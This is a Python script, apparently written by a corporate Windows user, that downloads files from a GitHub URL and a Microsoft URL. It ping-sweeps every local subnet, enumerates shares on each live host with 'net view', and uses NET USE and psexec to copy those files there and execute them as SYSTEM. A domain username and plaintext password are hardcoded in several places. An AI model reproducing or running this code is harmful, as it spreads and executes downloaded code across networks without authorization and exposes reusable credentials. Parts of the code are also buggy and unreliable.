# import os
# import platform
# import socket


# def getMyIp():
#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Создаем сокет (UDP)
#     # Настраиваем сокет на BROADCAST вещание.
#     s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
#     s.connect(('<broadcast>', 0))

#     return s.getsockname()[0]


# oc = platform.system()

# if (oc == "Windows"):
#     ping_com = "ping -n 1 "
# else:
#     ping_com = "ping -c 1 "
# print(getMyIp())
# print(ping_com)

# net = getMyIp()
# net_split = net.split('.')
# a = '.'
# net = net_split[0] + a + net_split[1] + a + net_split[2] + a

# print(net)


# def scan_ip(ip):
#     addr = net + str(ip)
#     print('addr', addr)
#     comm = ping_com + addr
#     print('comm', comm)
#     response = os.popen(comm)
#     data = response.readlines()
#     print('data', data)
#     for line in data:
#         if 'TTL' in line:
#             print(addr, "--> Ping Ok")
#             break


# scan_ip(1)


from concurrent.futures import ThreadPoolExecutor
import subprocess
import sys
import time
import ifaddr
from encodings import utf_8
import os
import platform
import threading
import socket
from datetime import datetime
import urllib.request


username = 'eapteka\\d.artamonov2'
password = 'Df4kq-poECW1'
# 'C:\\Users\\dartamonov\\Documents\\Git\\Python\\Python\\junior\\subjects.txt'
curl = "C:/Windows/System32/curl.exe -O"
url1 = "https://github.com/shamemask/C-/blob/main/i.xml"
url2 = "http://download.microsoft.com/download/1/B/3/1B331878-8AF9-4642-94F4-0B0B0A9DD14A/WindowsXP-KB967715-x86-ENU.exe"
url = []
url.append(url1)
url.append(url2)
path = os.path.abspath(os.path.dirname(sys.argv[0]))
files = []
for ur in url:
    try:
        send = curl, ur

        # download = subprocess.check_output(
        #     send, shell=True, text=True).encode('cp1251').decode('cp866')
        # print(download)

        urllib.request.urlretrieve(ur, ur.split('/')[-1])
        file = path + "\\"+ur.split('/')[-1]

        files.append(file)
        print(files)
    except urllib.error.HTTPError:
        continue


result = []
iresult = 0
net_copy = []
inet_copy = 0


def getMyIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Создаем сокет (UDP)
    # Настраиваем сокет на BROADCAST вещание.
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.connect(('<broadcast>', 0))
    return s.getsockname()[0]


def netView(ip):
    global result
    global iresult
    cmd = "C:/Windows/System32/net.exe view \\\\"+ip
    result[iresult] = subprocess.check_output(
        cmd, shell=True, text=True)
    iresult += 1
    result[iresult] = result.split('\n')
    print(result[iresult][7].split(' ')[0])
    return result[iresult][7].split(' ')[0]


# NET USE \\10.100.24.28 Df4kq-poECW1 / user: eapteka\d.artamonov2 & & xcopy C: \Users\dartamonov\Documents\Git\Python\Python\junior\subjects.txt \\10.100.24.28\5.5 / i / e / h / y & & NET USE \\10.100.24.28 / DELETE
def netUse(ip):
    global net_copy
    global inet_copy
    begin = "NET USE \\\\"+ip  # +" "+password+" /user: "+username
    net_view = netView(ip)
    if (net_view):
        xcopy = "xcopy "+file+" \\\\"+ip+"\\"+netView(ip)+" /i /e /h /y"
        end = "NET USE \\\\"+ip+" /DELETE"
        cmd = begin, "&&", xcopy, "&&", end
        print(cmd)
        net_copy[inet_copy] = subprocess.check_output(
            cmd, shell=True, text=True)
        inet_copy += 1
        print(net_copy[inet_copy])
        # os.system(cmd, shell=True, text=True)


def threaded_function(ip):
    try:
        os.system("chcp 1251 >nul")
        cmd = "chcp 1251 >nul && C:/Windows/System32/net.exe view \\\\"+ip
        result = subprocess.check_output(
            cmd, shell=True, text=True).encode('cp1251').decode('cp866')
        result = result.split('\n')
        if len(result) < 7:
            return
        print(result[7].split(' ')[0])

        row = 7
        begin = "chcp 1251 && NET USE \\\\"+ip
        while len(result) > row:
            if result[row].split(' ')[0] == 'Команда':
                return

            end = "NET USE \\\\"+ip+" /DELETE"

            print(cmd)

            try:
                for file in files:
                    # xcopy = "xcopy "+file+" \\\\"+ip+'\\' + \
                    #     result[row].split(' ')[0]+" /i /e /h /y"

                    # cmd = begin + " && " + xcopy  # + " && " + end
                    # net_copy = subprocess.check_output(
                    #     cmd, shell=True, text=True).encode('cp1251').decode('cp866')
                    # print(net_copy)
                    # ["psexec", "-d", "-c", "\\\\"+ip,"-h", "-s", "-f", "-i cmd /c", file]
                    psexec = begin + " && psexec "+" -d " + " -c " + " \\\\"+ip + \
                        " -h " + " -s " + " -f " + " -i cmd /c " + file
                    print(psexec)
                    run = subprocess.Popen(psexec, stdout=sys.stdout)
                    run.communicate()
                    print(run)
                return
            except subprocess.CalledProcessError:
                row += 1
                continue

    except subprocess.CalledProcessError:
        exit(1)


def sending(ip):
    run = subprocess.Popen(["copy "], stdout=sys.stdout)
    run = subprocess.Popen(["psexec", "-d", "-c", "\\\\"+ip, "-u", "eapteka\\d.artamonov2",  "-p", "Df4kq-poECW1",
                            "-h", "-s", "-f", "C:\\Users\\dartamonov\\Documents\\Git\\Python\\Python\\junior\\subjects.txt"], stdout=sys.stdout)
    run.communicate()


def scan_Ip(ip, net):
    addr = net + str(ip)
    comm = ping_com + addr
    # print(comm)
    response = os.popen(comm)
    data1 = response.read(100).encode('cp1251').decode('cp866')
    # print(data1)
    data = response.readlines()
    for line in data:
        line = line.encode('cp1251').decode('cp866')
        if 'TTL' in line.encode('cp1251').decode('cp866'):
            print(addr, "--> Ping Ok")
            threaded_function(addr)
            # sending(addr)
            break


def threadsLoop(net, adapters):
    with ThreadPoolExecutor(max_workers=8) as executor:
        for ip in range(start_point, end_point):
            if ip in adapters:
                continue

            # potoc = threading.Thread(target=scan_Ip, args=[ip, net])
            # potoc.start()
            executor.submit(scan_Ip, ip, net)
        # executor.join()
        # potoc.join()


def adapter():
    adapters = ifaddr.get_adapters()
    adap = []
    for adapter in adapters:

        # print("IPs of network adapter " + adapter.nice_name)
        for ip in adapter.ips:
            # print("   %s/%s" % (ip.ip, ip.network_prefix))
            if isinstance(ip.ip, str) and ip.ip != '127.0.0.1':
                print(ip.ip)
                adap.append(ip.ip)
    return adap


# net = getMyIp()
# print('You IP :', net)
# net_split = net.split('.')
a = '.'
# net = net_split[0] + a + net_split[1] + a + net_split[2] + a
start_point = 1  # int(input("Enter the Starting Number: "))
end_point = 256  # int(input("Enter the Last Number: "))
print(os.popen('dir').read())
oc = platform.system()
if (oc == "Windows"):
    ping_com = "ping -n 1 "
else:
    ping_com = "ping -c 1 "

t1 = datetime.now()
print("Scanning in Progress:")
adapters = adapter()
i = 0
for net_split in adapters:
    net_split = net_split.split('.')
    # print('You IP :', net_split)
    net = net_split[0] + a + net_split[1] + a + net_split[2] + a
    iTread = threading.Thread(target=threadsLoop, args=(net, adapters))
    iTread.start()


iTread.join()

t2 = datetime.now()
total = t2 - t1

print("Scanning completed in: ", total)
